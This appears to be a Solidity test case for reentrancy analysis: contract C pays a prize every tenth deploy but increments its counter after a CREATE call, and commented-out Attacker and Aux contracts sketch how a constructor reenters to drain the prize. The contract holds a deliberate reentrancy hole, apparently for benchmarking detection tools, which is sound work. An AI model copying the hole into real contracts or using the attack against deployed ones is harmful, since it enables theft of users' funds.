pragma solidity ^0.8.0;

// SPDX-License-Identifier: GPL-3.0


contract C {

    mapping (address => uint) public counters;

    function deploy_and_win(bytes memory initCode, address payable winner) public payable returns (address) {
		// to perform a deploy, 100 is required
		require(msg.value == 100);

		// every 10 deploys, a prize of 200 is sent to the second argument 
		if (counters[msg.sender] % 10 == 0) {
			winner.transfer(200);	// cannot reenter from here due to low gas
		}

		address addr;
        assembly {
            addr := create(0, add(initCode, 0x20), mload(initCode))	// can reenter only from here, i.e. from the constructor code
            if iszero(addr) {
                revert(0, 0)
            }
        }

		counters[msg.sender] += 1; // side effect after constructor call makes this vulnerable
		return addr;
    }
}

// contract Attacker {
//     bytes private create_auxharmless_initcode;
//     bytes private create_auxharmful_initcode;
//     address private victim;
//     // the first argument represents the (byte-encoded) code of the constructor of the Aux contract
//     constructor(bytes memory _create_auxharmless_initcode, bytes memory _create_auxharmful_initcode, address _victim) {    
//         create_auxharmless_initcode = _create_auxharmless_initcode;
//         create_auxharmful_initcode = _create_auxharmful_initcode;
//         victim = _victim;
//     }
//     function attack() public {
// 		C v = C(victim);
//         uint i = 0;
//         while (true) {
//             if (i % 10 == 0)
//                 // attack only every 10 instances, i.e. when some money is transfered
//     	        v.deploy_and_win{value: 100}(create_auxharmful_initcode, payable(address(this)));
//             else
//                 v.deploy_and_win{value: 100}(create_auxharmless_initcode, payable(address(this)));
//         }            
//     }
//     receive() external payable {}
// }

// contract AuxHarmless {
//     constructor() {}
// }

// contract AuxHarmful {
//     constructor(address payable attacker, bytes memory create_auxharmful_initcode) {
// 		C(msg.sender).deploy_and_win(create_auxharmful_initcode, attacker);
//     }
// }

